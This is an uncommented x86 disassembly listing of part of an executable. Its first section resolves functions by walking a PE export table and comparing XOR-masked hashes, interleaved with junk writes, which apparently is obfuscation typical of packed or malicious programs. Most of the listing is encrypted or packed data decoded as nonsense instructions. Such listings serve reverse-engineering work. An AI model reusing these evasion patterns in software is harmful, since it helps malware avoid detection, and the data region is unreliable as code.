  4061a0:	cmp    DWORD PTR ds:0x42a008,0x1f
  4061a7:	jne    0x4061d5
  4061ad:	push   0x42b010
  4061b2:	push   DWORD PTR [ebp-0x10]
  4061b5:	push   0x4f72
  4061ba:	push   0x42900c
  4061bf:	push   DWORD PTR [ebp-0x24]
  4061c2:	push   0x423982
  4061c7:	push   DWORD PTR [ebp-0x1c]
  4061ca:	push   0x3544
  4061cf:	call   DWORD PTR ds:0x424024
  4061d5:	jmp    0x406186
  4061da:	and    DWORD PTR ds:0x428020,0x0
  4061e4:	mov    ecx,DWORD PTR ds:0x428020
  4061ea:	inc    ecx
  4061eb:	mov    DWORD PTR ds:0x428020,ecx
  4061f1:	cmp    DWORD PTR ds:0x428020,0x1a
  4061f8:	jne    0x406211
  4061fe:	push   DWORD PTR [ebp-0x1c]
  406201:	push   0x561b
  406206:	push   0x3276
  40620b:	call   DWORD PTR ds:0x424028
  406211:	cmp    DWORD PTR ds:0x428020,0x17
  406218:	jb     0x4061e4
  40621e:	mov    eax,DWORD PTR [eax+0x18]
  406221:	mov    DWORD PTR [ebp-0x24],eax
  406224:	xor    eax,eax
  406226:	mov    eax,DWORD PTR [ebp-0x18]
  406229:	mov    ecx,DWORD PTR [ebp+0x8]
  40622c:	add    DWORD PTR ds:0x42901c,0x480
  406236:	add    ecx,DWORD PTR [eax+0x20]
  406239:	mov    DWORD PTR [ebp-0x2c],ecx
  40623c:	sub    DWORD PTR ds:0x42c00c,ebx
  406242:	mov    eax,DWORD PTR [ebp-0x18]
  406245:	mov    ecx,DWORD PTR [ebp+0x8]
  406248:	add    DWORD PTR ds:0x42a004,0x42a01c
  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	pop    esi
  40635b:	stos   DWORD PTR es:[edi],eax
  40635c:	aas    
  40635d:	cmp    DWORD PTR [eax],edi
  40635f:	cmp    esp,DWORD PTR [edx+0x62]
  406362:	adc    BYTE PTR [edi+0x62],bl
  406365:	bound  edx,QWORD PTR [edx-0x4cb5d2c6]
  40636b:	push   edi
  40636c:	cmp    BYTE PTR [edi-0x11],0x6
  406370:	sub    al,0x92
  406372:	pop    ds
  406373:	pop    esp
  406374:	inc    esi
  406375:	jo     0x406327
  406377:	mov    esi,0x866de699
  40637c:	daa    
  40637d:	jg     0x406333
  40637f:	push   edx
  406380:	ins    DWORD PTR es:[edi],dx
  406381:	xor    eax,0x779ff61a
  406386:	inc    esp
  406387:	repz jp 0x406356
  40638a:	mov    ds:0x508f2713,al
  40638f:	xlat   BYTE PTR ds:[ebx]
  406390:	xchg   al,ch
  406392:	jecxz  0x406403
  406394:	xchg   bp,ax
  406396:	jg     0x406368
  406398:	adc    DWORD PTR [edi+ebp*2+0x66],esp
  40639c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40639d:	xchg   eax,edi
  40639f:	and    DWORD PTR [ebx-0x29],edi
  4063a2:	out    dx,al
  4063a3:	test   DWORD PTR ds:0xc645c8e,ebx
  4063a9:	shl    dh,0x99
  4063ac:	add    DWORD PTR [edi+0x3f8936cb],esp
  4063b2:	les    ecx,FWORD PTR [ebx]
  4063b4:	je     0x40636c
  4063b6:	mov    al,BYTE PTR ds:0x5dc4d548
  4063bc:	jle    0x4063c6
  4063be:	sub    edx,ecx
  4063c0:	aad    0xfb
  4063c2:	call   DWORD PTR [edi+0x25]
  4063c5:	mov    ds:0xd219941e,al
  4063ca:	pop    esi
  4063cb:	mov    eax,DWORD PTR [edi]
  4063cd:	daa    
  4063ce:	mov    ds:0xceacac9,al
  4063d3:	aaa    
  4063d4:	xlat   BYTE PTR ds:[ebx]
  4063d5:	call   0xddd27b25
  4063da:	sub    BYTE PTR [edx+0x18],ah
  4063dd:	pushf  
  4063de:	ja     0x4063d1
  4063e0:	js     0x406450
  4063e2:	dec    eax
  4063e3:	inc    esi
  4063e4:	xchg   edi,eax
  4063e5:	ds and eax,0x9c9426f7
  4063eb:	adc    edx,DWORD PTR [edx-0x80]
  4063ee:	xor    esp,DWORD PTR [esi-0x57]
  4063f1:	pop    es
  4063f2:	call   0x9b7bf4bf
  4063f7:	cs push edx
  4063f9:	mov    ebp,DWORD PTR [eax-0x37ae32b1]
  4063ff:	or     dl,bh
  406401:	xchg   edx,eax
  406402:	in     eax,0xf9
  406404:	loopne 0x4063f8
  406406:	dec    ebp
  406407:	jecxz  0x4063fb
  406409:	pusha  
  40640a:	mov    WORD PTR [eax],fs
  40640c:	shl    DWORD PTR [eax+0x79],1
  40640f:	add    al,BYTE PTR [edx+ebx*4-0x37321cc2]
  406416:	push   ebx
  406417:	mov    esp,edx
  406419:	rcr    DWORD PTR [edx+0x1c30b554],cl
  40641f:	mov    bh,0xd9
  406421:	stos   BYTE PTR es:[edi],al
  406422:	sbb    ah,dh
  406424:	in     eax,dx
  406425:	ss inc esp
  406427:	scas   eax,DWORD PTR es:[edi]
  406428:	shl    eax,cl
  40642a:	sbb    eax,0x2bdb813b
  40642f:	shr    DWORD PTR [ecx],1
  406431:	jb     0x40647a
  406433:	iret   
  406434:	and    BYTE PTR [ebp+0x21054a91],dl
  40643a:	fsub   QWORD PTR [edx-0x3cd2de55]
  406440:	sbb    al,0xe4
  406442:	mov    WORD PTR ds:0xe38b926c,ss
  406448:	add    BYTE PTR [edi-0x12],bl
  40644b:	cli    
  40644c:	sahf   
  40644d:	je     0x4063e9
  40644f:	leave  
  406450:	test   DWORD PTR [edi+ecx*2],ebp
  406453:	pop    ss
  406454:	es nop
  406456:	outs   dx,BYTE PTR ds:[esi]
  406457:	sbb    DWORD PTR ds:0xb98c9d95,esp
  40645d:	sbb    esp,DWORD PTR [eax-0xe3d5975]
  406463:	sbb    DWORD PTR [edx],ebx
  406465:	sub    al,0xec
  406467:	fs cdq 
  406469:	cli    
  40646a:	xchg   ebp,eax
  40646b:	adc    al,0xca
  40646d:	out    dx,al
  40646e:	push   0xa6952a4b
  406473:	jo     0x4064db
  406475:	mov    ebp,0xb23ad85e
  40647a:	popa   
  40647b:	and    esp,DWORD PTR [ebp-0x681f2899]
  406481:	in     eax,dx
  406482:	jo     0x4064f1
  406484:	rol    BYTE PTR [ecx+eax*8+0x57],cl
  406488:	int    0xf1
  40648a:	ja     0x4064c0
  40648c:	pusha  
  40648d:	and    BYTE PTR [ebx],0x65
  406490:	mov    WORD PTR [esi-0x469854e9],gs
  406496:	(bad)  
  406497:	std    
  406498:	dec    esi
  406499:	pop    ds
  40649a:	inc    ecx
  40649b:	sub    BYTE PTR [ebx],dl
  40649d:	pushf  
  40649e:	inc    esi
  40649f:	leave  
  4064a0:	inc    esi
  4064a1:	fisub  DWORD PTR [edi+0x8]
  4064a4:	in     eax,0xa2
  4064a6:	inc    ebx
  4064a7:	inc    ebp
  4064a8:	dec    ebp
  4064a9:	push   ecx
  4064aa:	add    DWORD PTR [eax],ecx
  4064ac:	jecxz  0x406515
  4064ae:	jg     0x406507
  4064b0:	test   edx,ebx
  4064b2:	pop    edi
  4064b3:	add    al,0xc4
  4064b5:	rcl    bh,0xef
  4064b8:	jo     0x406463
  4064ba:	mov    bl,0x5
  4064bc:	sahf   
  4064bd:	jbe    0x4064e4
  4064bf:	retf   0x66da
  4064c2:	lods   eax,DWORD PTR ds:[esi]
  4064c3:	fild   WORD PTR [esi+0x3d30806b]
  4064c9:	ds dec edi
  4064cb:	xchg   esp,eax
  4064cc:	or     al,0xdd
  4064ce:	push   esi
  4064cf:	pop    esp
  4064d0:	pop    es
  4064d1:	jmp    0x9b72:0x5481d3c5
  4064d8:	xor    edi,ebx
  4064da:	and    BYTE PTR [eax-0x73c4e236],0x65
  4064e1:	xor    edx,DWORD PTR [esi+0x30]
  4064e4:	jg     0x406511
  4064e6:	sub    cl,BYTE PTR [esp+edi*4+0x727a3898]
  4064ed:	mov    edi,0xffa90e19
  4064f2:	ins    BYTE PTR es:[edi],dx
  4064f3:	xor    bh,BYTE PTR [edi+0x39373093]
  4064f9:	jo     0x4064c2
  4064fb:	je     0x4064a9
  4064fd:	mov    esi,0xbfb0acbe
  406502:	pop    esp
  406503:	sahf   
  406504:	rcr    DWORD PTR [eax-0x47b71045],cl
  40650a:	cmp    al,0xed
  40650c:	xchg   edi,eax
  40650d:	xchg   ebx,eax
  40650e:	ror    DWORD PTR [esi-0x5e],cl
  406511:	idiv   DWORD PTR [ecx+0x25]
  406514:	sar    BYTE PTR [ebx-0x6bfe02c0],1
  40651a:	ds pop ds
  40651c:	and    edx,ebp
  40651e:	adc    BYTE PTR [ebx-0x27d44dd],dh
  406524:	push   0x34af04fa
  406529:	jb     0x406569
  40652b:	out    0x92,eax
  40652d:	ret    
  40652e:	and    DWORD PTR [ebp+0x5],edx
  406531:	mov    dh,0x98
  406533:	fnstcw WORD PTR [edx]
  406535:	test   al,0xc9
  406537:	cmp    DWORD PTR [ebx],0x7d
  40653a:	aas    
  40653b:	ret    
  40653c:	out    0x9a,al
  40653e:	jne    0x40653b
  406540:	(bad)  
  406541:	mov    bh,0xf8
  406543:	ret    
  406544:	outs   dx,BYTE PTR ds:[esi]
  406545:	pop    ebx
  406546:	ror    BYTE PTR [esi],0x82
  406549:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40654a:	cmp    al,0x6
  40654c:	mov    al,0xbd
  40654e:	and    eax,0xba249221
  406553:	loopne 0x4064e4
  406555:	repnz pop edx
  406557:	or     esi,DWORD PTR [ebx-0xef40c88]
  40655d:	mov    cl,0x5b
  40655f:	mov    dl,0x4d
  406561:	repz stc 
  406563:	add    ecx,DWORD PTR [ebx]
  406565:	mov    al,0x46
  406567:	push   esp
  406568:	jg     0x406525
  40656a:	std    
  40656b:	push   edx
  40656c:	sti    
  40656d:	sub    BYTE PTR [ebp-0x5],cl
  406570:	(bad)  
  406572:	pop    ds
  406573:	xor    al,0x24
  406575:	scas   al,BYTE PTR es:[edi]
  406576:	or     al,0xd4
  406578:	mov    dh,0x98
  40657a:	sbb    eax,0xbe18942c
  40657f:	inc    ecx
  406580:	call   esp
  406582:	not    DWORD PTR [edx]
  406584:	rcl    ebx,0x99
  406587:	mov    eax,0xeb7eaee5
  40658c:	test   al,0x4b
  40658e:	mov    edx,0x9152db9c
  406593:	nop
  406594:	adc    DWORD PTR [esi+0x25],ebx
  406597:	imul   edi,DWORD PTR [edx+ebp*2+0x51],0xdb833312
  40659f:	popa   
  4065a0:	stos   DWORD PTR es:[edi],eax
  4065a1:	aas    
  4065a2:	ret    
  4065a3:	cli    
  4065a4:	lods   eax,DWORD PTR ds:[esi]
  4065a5:	(bad)  
  4065a6:	and    esp,ebx
  4065a8:	test   eax,0xb0ac0631
  4065ad:	add    bl,BYTE PTR [ecx-0x4a]
  4065b0:	jbe    0x406535
  4065b2:	fsubr  DWORD PTR [ebx]
  4065b4:	push   ebp
  4065b5:	mov    cl,0x1b
  4065b7:	je     0x406573
  4065b9:	cmp    eax,0x24b1212a
  4065be:	pop    eax
  4065bf:	inc    esp
  4065c0:	sub    BYTE PTR [esi-0x626caaff],bh
  4065c6:	pop    esi
  4065c7:	xor    BYTE PTR [ebx-0x6d],dh
  4065ca:	(bad)  
  4065cb:	sar    bl,0xc6
  4065ce:	cs inc eax
  4065d0:	call   0x9c13414b
  4065d5:	push   esi
  4065d6:	sub    BYTE PTR [esp+edx*2],ah
  4065d9:	dec    edi
  4065da:	fidivr DWORD PTR [ebp-0x70a452a8]
  4065e0:	push   esi
  4065e1:	imul   ebx,DWORD PTR [edi-0x2d49fa60],0x961a3135
  4065eb:	pop    ebp
  4065ec:	xor    al,0x24
  4065ee:	imul   esp,esi,0x7
  4065f1:	daa    
  4065f2:	sub    DWORD PTR [esi-0x62],edi
  4065f5:	cmc    
  4065f6:	fsub   DWORD PTR [ecx]
  4065f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065f9:	xor    al,dh
  4065fb:	mov    esi,fs
  4065fd:	mov    cl,0xc6
  4065ff:	inc    edi
  406600:	(bad)  
  406601:	js     0x4065e6
  406603:	pop    esi
  406604:	push   ebx
  406605:	loopne 0x406668
  406607:	jae    0x40666f
  406609:	loopne 0x40663f
  40660b:	dec    ecx
  40660c:	retf   0xe0b3
  40660f:	dec    ecx
  406610:	xor    ebx,eax
  406612:	mov    ecx,0x896233e3
  406617:	xchg   esi,eax
  406618:	adc    BYTE PTR [ebx-0x54],ah
  40661b:	adc    BYTE PTR [ebx],bl
  40661d:	scas   eax,DWORD PTR es:[edi]
  40661e:	leave  
  40661f:	inc    ebp
  406620:	dec    edi
  406621:	int    0xd5
  406623:	cmp    eax,0xfcd93667
  406628:	hlt    
  406629:	lods   eax,DWORD PTR ds:[esi]
  40662a:	jecxz  0x4066a6
  40662c:	out    0x41,al
  40662e:	fxch   st(5)
  406630:	sbb    edi,ebp
  406632:	mov    bh,0x4d
  406634:	enter  0x8346,0x71
  406638:	xchg   esi,eax
  40663a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40663b:	xor    BYTE PTR [edx+0x6b],0xa2
  40663f:	push   0xffffffde
  406641:	sbb    BYTE PTR [esp+eax*2+0x4c9e0951],cl
  406648:	sbb    eax,0xbf3c4eaf
  40664d:	(bad)  
  40664e:	icebp  
  40664f:	call   0xf9b:0x8eb4ac39
  406656:	xor    esi,DWORD PTR [ecx]
  406658:	ins    BYTE PTR es:[edi],dx
  406659:	pop    ecx
  40665a:	std    
  40665b:	mov    ah,0xfe
  40665d:	mov    bh,0x14
  40665f:	ret    
  406660:	jmp    0x40669e
  406662:	adc    BYTE PTR [esi-0x59],0xe7
  406666:	in     eax,0x60
  406668:	jne    0x406695
  40666a:	jno    0x40661c
  40666c:	loop   0x4066ba
  40666e:	ror    DWORD PTR [esi-0x41],1
  406671:	mov    ds:0x13ded5f6,al
  406676:	cmp    ecx,ebp
  406678:	clc    
  406679:	mov    eax,0xff922231
  40667e:	mulps  xmm3,XMMWORD PTR [esi-0x6d71f47]
  406685:	hlt    
  406686:	adc    al,0x84
  406688:	or     DWORD PTR [eax],eax
  40668a:	jb     0x406705
  40668c:	retf   0x262e
  40668f:	in     al,dx
  406690:	imul   eax,DWORD PTR [ebp-0x1ffe879b],0x4d
  406697:	psllq  mm5,QWORD PTR [ebx-0x71498bdb]
  40669e:	retf   
  40669f:	jmp    0x42c379b1
  4066a4:	push   edx
  4066a5:	add    al,dl
  4066a7:	scas   al,BYTE PTR es:[edi]
  4066a8:	xchg   esi,eax
  4066a9:	add    al,0x4
  4066ab:	nop
  4066ac:	adc    bl,BYTE PTR [edx+0x47]
  4066af:	dec    esi
  4066b0:	sub    eax,0x51a0fbe6
  4066b5:	sub    DWORD PTR [ebx],edi
  4066b7:	cmp    al,0xb9
  4066b9:	rol    BYTE PTR [edi+0x68a35eb7],cl
  4066bf:	push   ebp
  4066c0:	sbb    BYTE PTR [eax],dh
  4066c2:	ret    
  4066c3:	pusha  
  4066c4:	sti    
  4066c5:	push   es
  4066c6:	xchg   ebx,eax
  4066c7:	loopne 0x406724
  4066c9:	sbb    ebp,esi
  4066cb:	jmp    0x6aabcd2b
  4066d0:	sub    al,BYTE PTR [eax+0x727b63df]
  4066d6:	out    dx,al
  4066d7:	mov    fs:0x8b26d486,eax
  4066dd:	adc    BYTE PTR [ebx],0x9
  4066e0:	cmp    eax,0x64d76c10
  4066e5:	shl    BYTE PTR [ecx],cl
  4066e7:	mov    al,0xbf
  4066e9:	add    al,0xa2
  4066eb:	repnz xchg edx,eax
  4066ed:	int    0x61
  4066ef:	pushf  
  4066f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066f1:	jg     0x406704
  4066f3:	enter  0x79b,0x9e
  4066f7:	(bad)  
  4066f8:	fsubrp st(2),st
  4066fa:	push   0x338fb9f4
  4066ff:	out    0x7f,eax
  406701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406702:	add    DWORD PTR [edx+0x70eaff5e],ebx
  406708:	xlat   BYTE PTR ds:[ebx]
  406709:	add    eax,0xab19e216
  40670e:	sub    edi,edx
  406710:	aam    0xd
  406712:	test   DWORD PTR ds:0xf1fd3cb8,eax
  406718:	jecxz  0x40669a
  40671a:	xchg   DWORD PTR [ecx],esp
  40671c:	xchg   esi,eax
  40671d:	aam    0xaa
  40671f:	retf   
  406720:	lea    edx,[esi+0x6b]
  406723:	inc    edi
  406724:	mov    al,ds:0x790ef92f
  406729:	adc    BYTE PTR [edx-0x4d],bh
  40672c:	lock jae 0x406772
  40672f:	xchg   ebx,eax
  406730:	xor    eax,0xa38d5385
  406735:	lock repz mov ebx,0x56fb6c82
  40673c:	xchg   eax,esi
  40673e:	cmp    eax,DWORD PTR [esi]
  406740:	mov    ds:0x2663b881,al
  406745:	xchg   BYTE PTR [ebx],ah
  406747:	int3   
  406748:	rcr    esp,1
  40674a:	dec    eax
  40674b:	int3   
  40674c:	dec    esp
  40674d:	cmc    
  40674e:	addr16 adc al,0x61
  406751:	pop    ds
  406752:	out    0x2d,eax
  406754:	imul   edx,DWORD PTR [esi],0xdbddd490
  40675a:	call   0x68df663f
  40675f:	mov    eax,ds:0x90bab72e
  406764:	popf   
  406765:	adc    DWORD PTR [esi+ebp*2-0xeeb69dd],0x7da456d1
  406770:	adc    al,0x80
  406772:	arpl   WORD PTR [esi+0x11d47544],sp
  406778:	mov    esp,DWORD PTR [eax-0x43dd7829]
  40677e:	mov    dl,0x47
  406780:	add    bh,BYTE PTR [esi+0x40963fc7]
  406786:	cmp    DWORD PTR [esi+0x7d0fa9bb],edi
  40678c:	cld    
  40678d:	call   0x6460:0x955bb4b1
  406794:	clc    
  406795:	loopne 0x4067c2
  406797:	pop    ds
  406798:	push   0x1027bde3
  40679d:	jbe    0x40675a
  40679f:	imul   esi,DWORD PTR [ecx+0x73],0xffffff8f
  4067a3:	call   0x31b0:0x76fd0961
  4067aa:	sub    BYTE PTR [edi],dl
  4067ac:	mov    esp,0x21d02a6e
  4067b1:	scas   eax,DWORD PTR es:[edi]
  4067b2:	pop    ds
  4067b3:	mov    al,ds:0x19a1eba2
  4067b8:	pusha  
  4067b9:	sub    DWORD PTR [eax-0x687b9f1c],ebp
  4067bf:	out    dx,eax
  4067c0:	loop   0x4067c9
  4067c2:	shld   DWORD PTR [ebp-0x1f],ebx,0xaa
  4067c7:	jns    0x4067ff
  4067c9:	add    bh,BYTE PTR [edi+0x2a]
  4067cc:	bound  eax,QWORD PTR ds:0xe8656b2c
  4067d2:	mov    ebp,0xc9dc90d6
  4067d7:	mov    ch,BYTE PTR [esi]
  4067d9:	dec    esi
  4067da:	or     dh,BYTE PTR [ebx-0x4d]
  4067dd:	mov    edx,0x97bfa8a8
  4067e2:	in     eax,0xca
  4067e4:	hlt    
  4067e5:	nop
  4067e6:	cmp    DWORD PTR [esi+ebp*2+0x53],ebx
  4067ea:	mov    esp,0x5a448a71
  4067ef:	clc    
  4067f0:	xchg   esi,eax
  4067f1:	xchg   edx,eax
  4067f2:	jge    0x406793
  4067f4:	push   esp
  4067f5:	xor    al,0x5e
  4067f7:	inc    eax
  4067f8:	or     al,0x2d
  4067fa:	ret    
  4067fb:	sub    eax,0xc759f272
  406800:	and    ebp,DWORD PTR [eax+ebx*2]
  406803:	test   al,0xb2
  406805:	and    BYTE PTR [esi],ch
  406807:	add    DWORD PTR [eax+0x6f],ebp
  40680a:	test   eax,0xcbb6888c
  40680f:	mov    bl,0x83
  406811:	xchg   esp,eax
  406812:	cmp    eax,0x1be0f143
  406817:	fs push eax
  406819:	call   0x92da:0xce2c20f
  406820:	fcmovne st,st(1)
  406822:	pusha  
  406823:	push   ebx
  406824:	push   cs
  406825:	repnz mov BYTE PTR [ebx+0x27],0xe1
  40682a:	add    BYTE PTR [edx+edi*4-0x1a],al
  40682e:	pop    es
  40682f:	jl     0x4067f5
  406831:	push   esp
  406832:	mov    dh,0x5d
  406834:	add    esi,esp
  406836:	std    
  406837:	loop   0x406843
  406839:	or     cl,BYTE PTR [edx-0x557eb5c2]
  40683f:	mov    ds:0xff6b83ad,eax
  406844:	shr    BYTE PTR [esi-0x3],1
  406847:	mov    edx,0xb9fd95f9
  40684c:	xor    bl,BYTE PTR [edx-0x7b312673]
  406852:	cmp    eax,0x5cc06a8e
  406857:	mov    edi,0x4e889406
  40685c:	inc    ebx
  40685d:	sbb    al,0xd1
  40685f:	daa    
  406860:	scas   al,BYTE PTR es:[edi]
  406861:	xchg   BYTE PTR [esi+0x54f8c77c],ah
  406867:	inc    edx
  406868:	icebp  
  406869:	ins    BYTE PTR es:[edi],dx
  40686a:	cs xchg ebp,eax
  40686c:	jb     0x4068e6
  40686e:	cs mov dl,0xce
  406871:	jne    0x40685b
  406873:	lock cwde 
  406875:	sbb    eax,0xabc10eb9
  40687a:	and    dl,BYTE PTR [eax]
  40687c:	lahf   
  40687d:	xor    DWORD PTR [ebx+edi*8+0x79],esi
  406881:	leave  
  406882:	fist   WORD PTR fs:[ebp+0x75]
  406886:	mov    DWORD PTR [eax-0xa0e63cc],ebx
  40688c:	in     eax,dx
  40688d:	and    DWORD PTR [ebx-0x33d93c80],edi
  406893:	enter  0xf09f,0xd2
  406897:	xor    DWORD PTR [edi+0x1a49e107],0xffffffaa
  40689e:	(bad)  
  40689f:	mov    DWORD PTR [esi],esp
  4068a1:	in     al,0x20
  4068a3:	jl     0x4068f8
  4068a5:	mov    edx,0xe373a4a1
  4068aa:	xchg   ecx,eax
  4068ab:	(bad)  
  4068ac:	aad    0x4c
  4068ae:	enter  0xf0ef,0xe1
  4068b2:	ins    BYTE PTR es:[edi],dx
  4068b3:	out    0x83,eax
  4068b5:	inc    edi
  4068b6:	push   edi
  4068b7:	dec    eax
  4068b8:	ins    DWORD PTR es:[edi],dx
  4068b9:	out    0x83,al
  4068bb:	adc    eax,0x4f25a8d0
  4068c0:	out    dx,al
  4068c1:	scas   al,BYTE PTR es:[edi]
  4068c2:	and    eax,DWORD PTR [edi+0x2e0ff6ec]
  4068c8:	out    dx,eax
  4068c9:	jmp    0x4068dc
  4068cb:	push   0xae7e6290
  4068d0:	sub    BYTE PTR [edi],bl
  4068d2:	xchg   ebx,eax
  4068d3:	imul   ebx,DWORD PTR [edx],0xe96a1378
  4068d9:	sub    eax,0x2160ff47
  4068de:	mov    ebp,0x3b27f756
  4068e3:	rep lods eax,DWORD PTR cs:[esi]
  4068e6:	pop    ebp
  4068e7:	and    al,0x66
  4068e9:	icebp  
  4068ea:	(bad)  
  4068eb:	adc    ah,dl
  4068ed:	lods   eax,DWORD PTR ds:[esi]
  4068ee:	mov    ch,0x87
  4068f0:	xor    DWORD PTR [edi+edi*2],edi
  4068f3:	lods   eax,DWORD PTR ds:[esi]
  4068f4:	xor    BYTE PTR [ebx],ch
  4068f6:	push   DWORD PTR [ebp+0x58]
  4068f9:	mov    al,0x1c
  4068fb:	pop    esp
  4068fd:	lods   eax,DWORD PTR ds:[esi]
  4068fe:	xor    DWORD PTR [esi-0x64],ebp
  406901:	add    DWORD PTR [edx-0x58],ecx
  406904:	push   ecx
  406905:	das    
  406906:	pop    ds
  406907:	stos   BYTE PTR es:[edi],al
  406908:	scas   al,BYTE PTR es:[edi]
  406909:	xchg   edx,eax
  40690a:	dec    edx
  40690b:	dec    esp
  40690c:	mov    edi,DWORD PTR [esi]
  40690e:	add    al,bh
  406910:	int3   
  406911:	ins    BYTE PTR es:[edi],dx
  406912:	sbb    bl,bh
  406914:	(bad)  
  406915:	adc    DWORD PTR [ecx+0x6f],ebp
  406918:	jp     0x406955
  40691a:	aam    0x50
  40691c:	(bad)  
  40691d:	loopne 0x40698b
  40691f:	sbb    BYTE PTR [ecx+0x25],0xdc
  406923:	retf   0x8658
  406926:	repz add eax,ebp
  406929:	jge    0x4068f0
  40692b:	lock loop 0x4068ef
  40692e:	mul    DWORD PTR [eax+0x59de1594]
  406934:	mov    cl,0x6a
  406936:	ret    0xec5b
  406939:	bound  ecx,QWORD PTR ds:0xc4065ce8
  40693f:	mov    ds:0x5a680180,al
  406944:	jecxz  0x40699d
  406946:	hlt    
  406947:	dec    esi
  406948:	arpl   bp,dx
  40694a:	into   
  40694b:	inc    ebp
  40694c:	jne    0x4068fd
  40694e:	push   ebx
  40694f:	cmp    ecx,DWORD PTR [ebx+0x75d6b3cf]
  406955:	fimul  DWORD PTR [ebp-0x241dbf85]
  40695b:	dec    ebx
  40695c:	dec    esi
  40695d:	shr    DWORD PTR [ebx-0x1d],cl
  406960:	mov    bh,0x66
  406962:	fsub   QWORD PTR [edi+0x2783f917]
  406968:	adc    DWORD PTR [ebp-0x3],ebx
  40696b:	idiv   BYTE PTR [eax-0x5b]
  40696e:	das    
  40696f:	call   0xcb5b:0x920233fd
  406976:	or     cl,bh
  406978:	cmp    eax,0xc6d43b52
  40697d:	sub    al,0x3a
  40697f:	xchg   ecx,eax
  406980:	rcr    DWORD PTR [edx],0x49
  406983:	add    DWORD PTR [ecx+0x3b],esp
  406986:	and    BYTE PTR [ebx],al
  406988:	pop    ebp
  406989:	imul   BYTE PTR ds:0x5d2ca82
  40698f:	mov    ecx,0xb100f56
  406994:	mov    al,ds:0x5dfb2d52
  406999:	dec    ecx
  40699a:	dec    esi
  40699b:	imul   ebx,esi,0xcfcba7fa
  4069a1:	punpckhbw mm5,QWORD PTR [ebx+0x4f]
  4069a5:	xchg   edx,eax
  4069a6:	dec    ecx
  4069a7:	cwde   
  4069a8:	mov    ds:0xe8085108,eax
  4069ad:	sbb    ecx,ebx
  4069af:	rol    DWORD PTR es:[edi],cl
  4069b2:	sar    ebx,1
  4069b4:	push   edx
  4069b5:	xor    eax,0xc43ef11c
  4069ba:	jns    0x406a16
  4069bc:	retf   
  4069bd:	jp     0x406a3c
  4069bf:	sbb    BYTE PTR [eax+ebp*1+0x34234afd],ch
  4069c6:	jge    0x4069de
  4069c8:	adc    ebx,DWORD PTR [ebp-0x40f8c01b]
  4069ce:	push   edi
  4069cf:	sub    al,0xd7
  4069d1:	mov    edi,ecx
  4069d3:	push   ebx
  4069d4:	(bad)  
  4069d7:	(bad)  
  4069d8:	(bad)  
  4069da:	xor    al,0xc1
  4069dc:	sub    bl,BYTE PTR [edx-0xb]
  4069df:	(bad)  
  4069e0:	shl    ebx,cl
  4069e2:	adc    dl,bl
  4069e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069e5:	repnz iret 
  4069e7:	pop    esp
